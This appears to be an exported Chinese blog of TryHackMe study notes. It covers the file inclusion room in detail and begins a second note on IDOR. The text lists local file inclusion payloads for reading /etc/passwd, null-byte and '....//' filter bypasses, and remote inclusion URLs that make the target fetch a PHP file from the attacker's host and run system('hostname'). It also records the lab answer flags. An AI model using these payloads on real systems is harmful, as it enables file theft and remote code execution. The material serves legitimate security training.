<p>理论上，如果没有任何 输入验证处理，我们就可以通过上面的代码访问和显示服务器上的任何可读文件。假设我们要读取 <em><strong>&#x2F;etc&#x2F;passwd</strong></em> 文件，该文件的内容是 有关 Linux 操作系统用户的敏感信息，我们可以尝试使用以下url请求：<code>http://webapp.thm/get.php?file=/etc/passwd</code> 。在这种情况下，该url之所以有效，是因为<code>include</code>函数中没有指定目录，也没有做 输入验证处理。</p>
<p><em><strong>2.接下来，在下面的代码中，开发人员决定指定函数内部的目录。</strong></em></p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>PHP</span><br><span class="line">    <span class="keyword">include</span>(<span class="string">&quot;languages/&quot;</span>. <span class="variable">$_GET</span>[<span class="string">&#x27;lang&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>在上面的代码中，开发者决定使用<code>include</code>函数并且通过<code>lang</code>参数来调用<code>languages</code>目录下的PHP页面文件。</p>
<p>如果没有做输入验证处理，攻击者可以通过将<code>lang</code>输入替换为其他操作系统敏感文件（例如 <code>/etc/passwd</code>）来操纵 URL，相关的 payload 看起来类似于路径遍历漏洞，<code>include</code> 函数允许我们将任何可调用的文件包含到当前页面中，以下是具体的漏洞利用：</p>
<p><code>http://webapp.thm/index.php?lang=../../../../etc/passwd</code></p>
<p><strong>答题</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221115232913681.png"
                      alt="image-20221115232913681"
                ></p>
<p>部署目标机并启动攻击机，访问目标站点，选择关卡Lab#1：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221117223851902.png"
                      alt="image-20221117223851902"
                ></p>
<blockquote>
<p>&#x2F;lab1.php?file&#x3D;&#x2F;etc&#x2F;passwd</p>
</blockquote>
<p>访问目标站点，选择关卡Lab#2：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221117224544952.png"
                      alt="image-20221117224544952"
                ></p>
<blockquote>
<p>includes</p>
</blockquote>
<h2 id="本地文件包含（LFI）-2"><a href="#本地文件包含（LFI）-2" class="headerlink" title="本地文件包含（LFI）#2"></a>本地文件包含（LFI）#2</h2><p>在本小节中，我们将会更深入地去研究 LFI漏洞。我们将讨论一些绕过 include 函数中的过滤器的技术。</p>
<p>**1.**在上一小节中，主要介绍了两种代码情境，我们首先检查了web app的代码，然后我们才知道如何利用它；但是，在本节中，我们要进行的是黑盒测试，我们没有源代码以供查看。</p>
<p>在黑盒环境下：有效的报错信息对于我们理解数据将如何在 Web 应用程序中传递和处理非常重要。</p>
<p>假设我们有以下入口点：<code>http://webapp.thm/index.php?lang=EN</code>。如果我们输入一个无效的输入，比如THM，我们会得到如下错误提示信息：</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line">Warning: <span class="keyword">include</span>(languages/THM.php): failed to open stream: No such file <span class="keyword">or</span> directory in /<span class="keyword">var</span>/www/html/THM-<span class="number">4</span>/index.php on line <span class="number">12</span></span><br></pre></td></tr></table></figure></div>

<p>通过输入 THM ，得到的错误消息将显示 include 函数的具体内容：<code>include(languages/THM.php);</code>。</p>
<p>如果仔细查看报错提示中所包含的目录信息，我们能够可以知道<code>languages</code> 目录下的被函数所包含的文件会在条目末尾自动添加 <code>.php</code>后缀。因此一个有效的输入将是如下内容：<code>index.php?lang=EN</code>，其中 EN文件 将位于给定的<code>languages</code>目录下，名为 <code>EN.php</code>。</p>
<p>此外，该报错提示还披露了关于完整 Web 应用程序目录路径的另一条重要信息，即 <code>/var/www/html/THM-4/</code>，利用这一个信息，我们可以使用 <code>../</code>以跳出当前文件夹（即&#x2F;var&#x2F;www&#x2F;html&#x2F;THM-4&#x2F;languages）：</p>
<div class="highlight-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="code"><pre><span class="line">http://webapp.thm/index.php?lang=../../../../../etc/passwd</span><br></pre></td></tr></table></figure></div>

<p>注意：我们需要使用 5个 <code>../</code> ，因为我们通过报错信息 已经知道当前路径有四级目录 <code>/var/www/html/THM-4</code>然后再加上之前提到的<code>languages</code>目录，所以一共有需要5个<code>../</code>，但是我们仍然会收到以下报错信息：</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line">Warning: <span class="keyword">include</span>(languages/../../../../../etc/passwd.php): failed to open stream: No such file <span class="keyword">or</span> directory in /<span class="keyword">var</span>/www/html/THM-<span class="number">4</span>/index.php on line <span class="number">12</span></span><br></pre></td></tr></table></figure></div>

<p>根据报错信息：我们可以跳出出当前的 PHP 目录，但是 <em><strong>include</strong></em> 函数仍然会给文件末尾添加<code>.php</code>后缀！这说明相关的开发人员已经指定了要传递给 <em><strong>include</strong></em> 函数的文件类型，我们可以尝试使用 NULL BYTE，即 %00 来将文件后缀截断。</p>
<p>添加空字节是一种注入技术，通过在用户所提供的数据中添加 URL 编码<code>%00</code>或十六进制的<code>0x00</code>就能够终止 web应用程序对字符串的读取操作，也就是说：此操作将试图欺骗 Web 应用程序以使其忽略 Null Byte 之后的任何内容。</p>
<p>通过在payload末尾添加空字节，我们将告诉 <em><strong>include</strong></em> 函数忽略空字节之后的任何内容（实际操作时–在浏览器的地址栏中输入url形式的payload）：</p>
<p><code>include(&quot;languages/../../../../../etc/passwd%00&quot;).&quot;.php&quot;);</code> 相当于<code>include(&quot;languages/../../../../../etc/passwd&quot;);</code></p>
<p>注意：<code>%00</code> 技巧已修复，该技巧不适用于 PHP 5.3.4 及更高版本。</p>
<p>**2.**假设开发者决定过滤关键字以避免泄露敏感信息！正在被过滤的是<code>/etc/passwd</code>文件。此时，有两种可能的方法可以尝试绕过该过滤器：通过在过滤关键字的末尾使用空字节 <code>%00</code> 或使用访问当前目录技巧<code>/.</code>。</p>
<p>相关payload可参考以下内容：<code>http://webapp.thm/index.php?lang=/etc/passwd%00</code>或<code>http://webapp.thm/index.php?lang=/etc/passwd/.</code></p>
<p>为了更清楚地理解访问当前目录技巧<code>/.</code>，我们可以查看以下例子：如果我们在文件系统中使用<code>cd ..</code>，我们将切换到上一级目录；如果我们使用的是<code>cd.</code>，我们仍然将停留在当前目录。</p>
<p>因此，当我们输入<code>/etc/passwd/..</code>时，我们将切换目录到<code>/etc/</code>，然后当我们输入<code>/etc/passwd/.</code>时，将停留在当前目录<code>/etc/passwd</code>（因为<code>.</code>指代的就是当前工作目录，所以并不会进行目录切换操作）。</p>
<p>**3.**假设在以下场景中，开发者开始通过过滤一些其他关键字来进行输入验证处理。 我们可以先输入一些内容测试一下并检查错误信息！</p>
<p>当我们输入<code>http://webapp.thm/index.php?lang=../../../../etc/passwd</code>时，如果收到如下错误提示：</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line">Warning: <span class="keyword">include</span>(languages/etc/passwd): failed to open stream: No such file <span class="keyword">or</span> directory in /<span class="keyword">var</span>/www/html/THM-<span class="number">5</span>/index.php on line <span class="number">15</span></span><br></pre></td></tr></table></figure></div>

<p>这说明：<code>../</code>关键字被过滤了，当我们检查 include (language&#x2F;etc&#x2F;passwd)部分中的警告消息时,我们可以发现web应用程序使用空的字符串内容替代了<code>../</code>。</p>
<p>我们可以使用一些技术来绕过上述过滤的限制，尝试使用以下payload：<code>....//....//....//....//....//etc/passwd</code>。这种方式被称为“双写绕过”。</p>
<p>双写绕过生效原因：PHP 过滤器仅匹配并替换它找到的第一个子集字符串 <code>../</code>并且不做再次过滤，所以当双写绕过执行成功时，将留下下图所示的内容。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221118093840924.png"
                      alt="image-20221118093840924"
                ></p>
<p>**4.**最后，我们将讨论如果开发人员强制<code>include</code>函数从已定义的目录中读取目标文件的情况！</p>
<p>例如，如果 Web 应用程序要求用户提供一个必须包含指定目录的输入：<code>http://webapp.thm/index.php?lang=languages/EN.php</code>。</p>
<p>为了成功利用此类情况下的文件包含漏洞，我们可以尝试在payload中包含指定目录，即：<code>?lang=languages/../../../../../etc/passwd</code>。</p>
<p><strong>答题</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221115232938428.png"
                      alt="image-20221115232938428"
                ></p>
<p>部署目标机并启动攻击机，访问目标站点，选择关卡Lab#3：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221117234101639.png"
                      alt="image-20221117234101639"
                ></p>
<p>访问目标站点，选择关卡Lab#4：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221118160048757.png"
                      alt="image-20221118160048757"
                ></p>
<div class="highlight-container" data-rel="Http"><figure class="iseeu highlight http"><table><tr><td class="code"><pre><span class="line">http://webapp.thm/index.php?file=/etc/passwd%00</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221118155853503.png"
                      alt="image-20221118155853503"
                ></p>
<div class="highlight-container" data-rel="Http"><figure class="iseeu highlight http"><table><tr><td class="code"><pre><span class="line">http://webapp.thm/index.php?file=/etc/passwd/.</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221118155747181.png"
                      alt="image-20221118155747181"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221118160249727.png"
                      alt="image-20221118160249727"
                ></p>
<blockquote>
<p>导致此处发生目录遍历的函数为：file_get_contents</p>
</blockquote>
<p>访问目标站点，选择关卡Lab#5：</p>
<div class="highlight-container" data-rel="Http"><figure class="iseeu highlight http"><table><tr><td class="code"><pre><span class="line">....//....//....//....//etc/passwd</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221118161033857.png"
                      alt="image-20221118161033857"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221118161447206.png"
                      alt="image-20221118161447206"
                ></p>
<p>访问目标站点，选择关卡Lab#6：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221118161757349.png"
                      alt="image-20221118161757349"
                ></p>
<div class="highlight-container" data-rel="Http"><figure class="iseeu highlight http"><table><tr><td class="code"><pre><span class="line">THM-profile/../../../../../etc/os-release</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221118161952567.png"
                      alt="image-20221118161952567"
                ></p>
<blockquote>
<p>指定要包含的目录为：THM-profile</p>
<p>读取&#x2F;etc&#x2F;os-release文件内容，<strong>VERSION_ID</strong> 的值为：12.04</p>
</blockquote>
<h2 id="远程文件包含（RFI）"><a href="#远程文件包含（RFI）" class="headerlink" title="远程文件包含（RFI）"></a>远程文件包含（RFI）</h2><p>远程文件包含 (RFI) 是一种将远程文件包含到易受攻击的应用程序中的技术。 与 LFI 一样，RFI 发生在不正确地验证用户输入时，该漏洞允许攻击者将外部的 URL 注入 <code>include</code> 函数中。 RFI 的一项前置要求是需要目标服务器启用<code>allow_url_fopen</code>选项（将该选项设置为<code>on</code>）。</p>
<p>RFI 的风险高于 LFI，因为 RFI 漏洞能够允许攻击者在web服务器上进行远程命令执行操作 (RCE漏洞)。 成功的 RFI 攻击的其他后果包括：</p>
<ul>
<li><p>敏感信息泄露</p>
</li>
<li><p>Cross-site Scripting (XSS)-跨站脚本攻击</p>
</li>
<li><p>Denial of Service (DoS)-拒绝服务攻击</p>
</li>
</ul>
<p>外部服务器必须与web应用程序服务器进行通信 才能成功进行 RFI 攻击。攻击者可以在其自身拥有的外部服务器上事先托管恶意文件，然后通过HTTP请求将恶意文件注入到目标web服务器上的<code>include</code>函数中，注入成功之后，恶意文件的内容就能在易受攻击的目标web应用服务器上得到执行。</p>
<p><strong>RFI（远程文件包含）漏洞利用步骤</strong></p>
<p>下图是一个成功的RFI攻击的步骤示例！ 假设攻击者在他们自己的服务器上托管了一个 PHP 文件<code>http://attacker.thm/cmd.txt</code>，其中 <code>cmd.txt</code> 包含的内容为打印一个消息 <code>Hello THM</code>。</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>PHP <span class="keyword">echo</span> <span class="string">&quot;Hello THM&quot;</span>; <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>首先，攻击者注入恶意URL，指向攻击者自身拥有的服务器，如<code>http://webapp.thm/index.php?lang=http://attacker.thm/cmd.txt</code>。 如果目标web服务器的<em><strong>输入验证处理</strong></em> 不严格，则恶意 URL 会传递到目标web服务器的<code>include</code>函数中。</p>
<p>接下来，Web 应用程序服务器将向恶意服务器发送 GET 请求以获取恶意文件，该请求的结果是：目标Web 应用程序会将远程文件包含到 <code>include</code> 函数中，以在目标web服务器的当前页面内执行 PHP 文件并将执行的结果发送给攻击者。</p>
<p>在本例中，恶意文件的执行结果为：目标站点的当前页面的某处将显示一个 <code>Hello THM</code> 消息。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221118163210840.png"
                      alt="image-20221118163210840"
                ></p>
<p><strong>操作</strong></p>
<p>首先在攻击机上新建一个文件：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221118170009447.png"
                      alt="image-20221118170009447"
                ></p>
<p>然后在攻击机上开启一个简易web服务器，托管刚才所创建的文件：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">python3 -m http.server</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221118170934166.png"
                      alt="image-20221118170934166"
                ></p>
<p>最后使用浏览器访问目标页面：<code>http://machine_ip/playground.php</code>，在url地址栏中，执行远程文件包含payload，完成RFI攻击过程：</p>
<div class="highlight-container" data-rel="Http"><figure class="iseeu highlight http"><table><tr><td class="code"><pre><span class="line">http://10.10.201.162/playground.php?file=http://10.10.198.7:8000/cmd.txt</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221118170832541.png"
                      alt="image-20221118170832541"
                ></p>
<h2 id="文件包含漏洞防范建议"><a href="#文件包含漏洞防范建议" class="headerlink" title="文件包含漏洞防范建议"></a>文件包含漏洞防范建议</h2><p>作为开发人员，了解 Web 应用程序漏洞、掌握漏洞的发现方法以及预防方法非常重要。 为了防止文件包含漏洞被攻击者利用，一些常见的建议包括：</p>
<ul>
<li><p>将系统和服务（包括 Web 应用程序框架）更新为最新版本。</p>
</li>
<li><p>关闭 PHP 报错以避免泄露应用程序的路径和其他可能泄露的信息。</p>
</li>
<li><p>Web 应用程序防火墙 (WAF) 是帮助减轻 Web 应用程序攻击的不错选择。</p>
</li>
<li><p>如果你的 Web 应用程序不需要，请禁用一些会导致文件包含漏洞的 PHP 功能，例如 <code>allow_url_fopen</code> （<code>on</code> 选项）和 <code>allow_url_include</code>。</p>
</li>
<li><p>仔细分析 Web 应用程序，只允许需要的协议和 PHP 包装器。</p>
</li>
<li><p>永远不要相信用户的输入，并确保针对文件包含实施适当的输入验证处理。</p>
</li>
<li><p>对文件名和文件位置实施白名单以及黑名单策略。</p>
</li>
</ul>
<h2 id="挑战"><a href="#挑战" class="headerlink" title="挑战"></a>挑战</h2><p>很好！ 现在应用你学到的技巧来夺取旗帜（flag）！ 熟悉 HTTP Web 基础知识可以帮助你更快完成这些挑战。</p>
<p>确保目标虚拟机已启动并正在运行，然后访问：<code>http://machine_ip/challenges/index.php</code></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221118185950957.png"
                      alt="image-20221118185950957"
                ></p>
<p><strong>LFI（本地文件包含）漏洞测试步骤</strong></p>
<ol>
<li>找到可输入的入口点，可能通过以下方式： GET、POST、COOKIE 或 HTTP 标头的值（values）！</li>
<li>输入有效输入以查看 Web 服务器的行为方式。</li>
<li>输入无效输入，包括特殊字符和常见文件名。</li>
<li>不要总是相信你在输入表单中提供的输入就是你想要执行的payload！ 尝试使用浏览器地址栏或 Burpsuite等工具。</li>
<li>在输入无效输入时，尝试查看报错信息以揭示 Web 应用程序的当前路径； 如果没有报错信息，那么进行反复试验可能是你的最佳选择。</li>
<li>了解目标web应用程序所做的“输入验证”处理以及目标web服务器是否应用了任何过滤器！</li>
<li>尝试注入一个有效输入来读取敏感文件内容。</li>
</ol>
<p><strong>答题</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221115233009005.png"
                      alt="image-20221115233009005"
                ></p>
<p>访问<code>http://10.10.81.7/challenges/chall1.php</code> （此处提示要修改请求方法为POST）：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221118191602242.png"
                      alt="image-20221118191602242"
                ></p>
<p>在上图页面中的输入框里输入一个文件名，然后使用Burpsuite抓取chall1.php页面的数据包，修改方法为POST并添加Request body：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221118191441830.png"
                      alt="image-20221118191441830"
                ></p>
<blockquote>
<p>flag1：F1x3d-iNpu7-f0rrn</p>
</blockquote>
<p>访问<code>http://10.10.81.7/challenges/chall2.php</code> （此处提示可用的payload和cookie有关）：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221118191710894.png"
                      alt="image-20221118191710894"
                ></p>
<p>打开浏览器内置的开发者工具，多次修改该页面的cookie值，根据页面返回的信息找到合适的payload：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221118192009463.png"
                      alt="image-20221118192009463"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221118192221468.png"
                      alt="image-20221118192221468"
                ></p>
<p>根据上面尝试的结果，使用以下payload来注入到cookie值中：</p>
<div class="highlight-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="code"><pre><span class="line">../../../../etc/flag2%00</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221118192602019.png"
                      alt="image-20221118192602019"
                ></p>
<blockquote>
<p>flag2：c00k13_i5_yuMmy1</p>
</blockquote>
<p>访问<a class="link"   href="http://10.10.81.7/challenges/chall3.php" >http://10.10.81.7/challenges/chall3.php <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> （此处提示该页面使用<code>$_REQUESTS</code>来接受 HTTP 请求，由PHP文档可知：<code>$_REQUEST</code>方法可以包含 <code>$_GET</code>、<code>$_POST</code> 和 <code>$_COOKIE</code> 的内容）。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221118194056504.png"
                      alt="image-20221118194056504"
                ></p>
<p>使用Burpsuite抓取该页面的数据包并修改请求方法为POST、添加request body、使用<code>%00</code>截断（手动输入而不是使用Inspector）：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221118195129814.png"
                      alt="image-20221118195129814"
                ></p>
<blockquote>
<p>flag3：P0st_1s_w0rk1in9</p>
</blockquote>
<p>通过<code>http://machine_ip/playground.php</code>页面执行RFI攻击，尝试获得RCE以知晓目标操作系统的主机名（具体操作步骤和本文第6小节类似）：</p>
<p>在攻击机上新建一个文件RFI.txt，内容如下：</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># This code will print the hostname of the server</span></span><br><span class="line"><span class="meta">&lt;?</span>PHP</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">system</span>(<span class="string">&#x27;hostname&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221118202228369.png"
                      alt="image-20221118202228369"
                ></p>
<p>将新建的文件托管在 Python3 服务器上，使用以下命令在攻击机上启动 Python3 服务器：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">python3 -m http.server 8000</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221118202325243.png"
                      alt="image-20221118202325243"
                ></p>
<p>使用浏览器访问<code>http://10.10.213.213/playground.php</code>页面，在浏览器的url地址栏输入以下payload：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://10.10.213.213/playground.php?file=http://10.14.32.186:8000/RFI.txt</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221118202928352.png"
                      alt="image-20221118202928352"
                ></p>
<blockquote>
<p>输出结果为：lfi-vm-thm-f8c5b1a78692</p>
</blockquote>
]]></content>
      <categories>
        <category>TryHackMe笔记</category>
      </categories>
      <tags>
        <tag>TryHackMe</tag>
        <tag>Web安全</tag>
      </tags>
  </entry>
  <entry>
    <title>THM-IDOR(不安全的直接对象引用)-学习</title>
    <url>/2024/01/27/THM-IDOR(%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E7%9B%B4%E6%8E%A5%E5%AF%B9%E8%B1%A1%E5%BC%95%E7%94%A8)-%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<p>本文相关的TryHackMe实验房间链接：<a class="link"   href="https://tryhackme.com/room/idor" >https://tryhackme.com/room/idor <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>本文相关内容：了解如何查找和利用web应用程序中的IDOR漏洞，该漏洞能够让我们尝试访问我们本不应该查看的数据。</p>
<h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p><strong>什么是IDOR</strong></p>
<p> IDOR 代表不安全的直接对象引用，是访问控制漏洞的一种类型（IDOR越权漏洞，属于授权逻辑型漏洞）。</p>
<p>当 Web 服务器接收用户提供的输入来检索对象(文件、数据、文档)时，如果对用户输入数据的信任度过高，且在服务器端没有进行验证来确认”所请求的对象”是否属于”有权请求它的用户”，那么这种类型的漏洞就有可能会发生:使你能够访问不应该拥有的文件、数据、文档等对象。</p>
<p><strong>答题</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20220930172013720.png"
                      alt="image-20220930172013720"
                ></p>
<h2 id="IDOR示例"><a href="#IDOR示例" class="headerlink" title="IDOR示例"></a>IDOR示例</h2><p> 假设你刚刚注册了一项在线服务，你现在想要更改你的个人资料信息，你点击的链接会进入 <a class="link"   href="http://online-service.thm/profile?user_id=1305" >http://online-service.thm/profile?user_id=1305 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 页面，你可以看到你的个人资料信息。</p>
<p> 你的好奇心占了上风，于是你尝试将 user _ id 值更改为1000( <a class="link"   href="http://online-service.thm/profile?user_id=1000" >http://online-service.thm/profile?user_id=1000 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>) ，令你惊讶的是，你现在可以看到ID为1000的用户的个人信息，你现在已经发现了 一个IDOR 漏洞！在理想情况下，网站上应该有一个检查机制，以确认某个ID相关的一些信息 只有当前所登录的 对应ID的用户才能访问。</p>
<p><strong>答题</strong></p>
<p>利用你上面学到的知识，点击查看TryHackMe网站在本页面所提供的站点按钮，通过发现和利用 IDOR 漏洞（修改url中的数值）来尝试接收一个标志。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221003202133070.png"
                      alt="image-20221003202133070"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221003202232197.png"
                      alt="image-20221003202232197"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221003202306195.png"
                      alt="image-20221003202306195"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221003202350604.png"
                      alt="image-20221003202350604"
                ></p>
<h2 id="在编码后的IDs中寻找IDOR漏洞"><a href="#在编码后的IDs中寻找IDOR漏洞" class="headerlink" title="在编码后的IDs中寻找IDOR漏洞"></a>在编码后的IDs中寻找IDOR漏洞</h2><p><strong>编码过的IDs（Encoded IDs）</strong></p>
<p>将数据从一个页面传递到另一个页面，或者发布数据、查询字符串或 cookie的时候，网页开发人员通常会首先获取原始数据并对其进行编码处理，编码能确保接收到信息的web服务器能够理解收到的内容（不经过编码处理的数据 是web服务器理解不了的）。</p>
<p>编码技术通常使用<code>a-z, A-Z, 0-9 and =</code>字符进行填充，将二进制数据更改为 ASCII 字符串形式。Web 上最常用的编码技术是 base64编码，这种编辑方式通常很容易识别。</p>
<p>你可以使用像<a class="link"   href="https://www.base64decode.org/" >https://www.base64decode.org/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 的网站来解码base64字符串，然后重新编辑数据并使用<a class="link"   href="https://www.base64encode.org/" >https://www.base64encode.org/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 网站再重新进行一次base64编码，然后重新提交 Web 请求，看看响应消息中是否有变化。</p>
<p>下图是解码并重新编码过程的一个图形示例:</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221003204915428.png"
                      alt="image-20221003204915428"
                ></p>
<p><strong>答题</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221003204755309.png"
                      alt="image-20221003204755309"
                ></p>
<h2 id="在hash加密的IDs中寻找IDOR漏洞"><a href="#在hash加密的IDs中寻找IDOR漏洞" class="headerlink" title="在hash加密的IDs中寻找IDOR漏洞"></a>在hash加密的IDs中寻找IDOR漏洞</h2><p><strong>哈希加密过的IDs（Hashed IDs）</strong> </p>
<p>处理哈希加密之后的ID 要比 处理编码后的ID稍微复杂一些，但它们可能遵循一种可预测的模式，例如整数值的hash版本，例如，如果使用 md5散列(哈希)算法，ID 号123将变成202cb962ac59075b964b07152d234b70 。</p>
<p>你可以将你发现的哈希值放入在线网站，如<a class="link"   href="https://crackstation.net/" >https://crackstation.net/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> (它有一个数十亿散列值结果的数据库) 看看能不能找到匹配的。</p>
<p><strong>答题</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221003205826455.png"
                      alt="image-20221003205826455"
                ></p>
<h2 id="在不可预测的ID中寻找IDOR漏洞"><a href="#在不可预测的ID中寻找IDOR漏洞" class="headerlink" title="在不可预测的ID中寻找IDOR漏洞"></a>在不可预测的ID中寻找IDOR漏洞</h2><p><strong>不可预测的IDs</strong></p>
<p>如果使用上述方法无法检测到 Id，那么检测IDOR漏洞的一个很好的方法是创建两个帐户并交换它们的 Id 号。</p>
<p>如果你可以直接使用其他用户的 ID 号查看其他用户的内容，同时仍然在使用 “非此ID对应的帐户” 登录(或者根本没有登录) ，那么你就发现了一个IDOR 漏洞。</p>
<p><strong>答题</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221003210442797.png"
                      alt="image-20221003210442797"
                ></p>
<h2 id="IDOR漏洞一般位于哪里？"><a href="#IDOR漏洞一般位于哪里？" class="headerlink" title="IDOR漏洞一般位于哪里？"></a>IDOR漏洞一般位于哪里？</h2><p>你所针对的易受攻击的点 可能并不总是你在地址栏中看到的东西，它可以是浏览器通过 AJAX 请求加载的内容，也可以是 JavaScript 文件中引用的内容。</p>
<p>有时，易受攻击的点可能有一个未引用的参数，这个参数在开发期间可能有用，并被推到生产环境中。</p>
<p>例如，你可能会注意到显示用户信息时调用的是**&#x2F;user&#x2F;details**  (通过你的会话验证)，但是，通过名为参数挖掘的攻击，也许能够发现一个名为<strong>user_id</strong>的未引用参数，你可以使用该参数显示其他用户的信息，如**&#x2F;user&#x2F;details?user_id&#x3D;123** 。</p>
<h2 id="一个实际的IDOR示例"><a href="#一个实际的IDOR示例" class="headerlink" title="一个实际的IDOR示例"></a>一个实际的IDOR示例</h2><p>打开TryHackMe网站在该知识点页面 提供的链接。</p>
<p>首先你需要登录，为此，单击客户部分并创建一个帐户。登录后，单击“你的帐户”选项卡。</p>
<p>Your Account 部分允许你更改用户名、电子邮件地址和密码等信息。你会注意到用户名和电子邮件字段预先填写了你注册账户时填的信息。</p>
<p>我们先调查一下这些信息是如何预先填写的，如果打开浏览器开发人员工具（F12），选择网络（network）选项卡，然后刷新页面，你将看到一个对端点的调用，路径为&#x2F;api&#x2F;v1&#x2F;customer?id&#x3D;<code>&#123;user_id&#125;</code>。</p>
<p> 此页面以 JSON 格式返回你的用户 ID、用户名和电子邮件地址。我们可以从路径中看到，所显示的用户信息来自查询字符串的 id 参数(见下图)</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221003221623986.png"
                      alt="image-20221003221623986"
                ></p>
<p>你可以通过将 id 更改为另一个用户的 id 来测试这个 id 参数是否存在 IDOR 漏洞，尝试选择 ID 为1和3的用户，然后回答下面的问题。</p>
<p><strong>答题</strong></p>
<p>建议使用火狐浏览器，使用TryHackMe网站提供的Attack Box即可。</p>
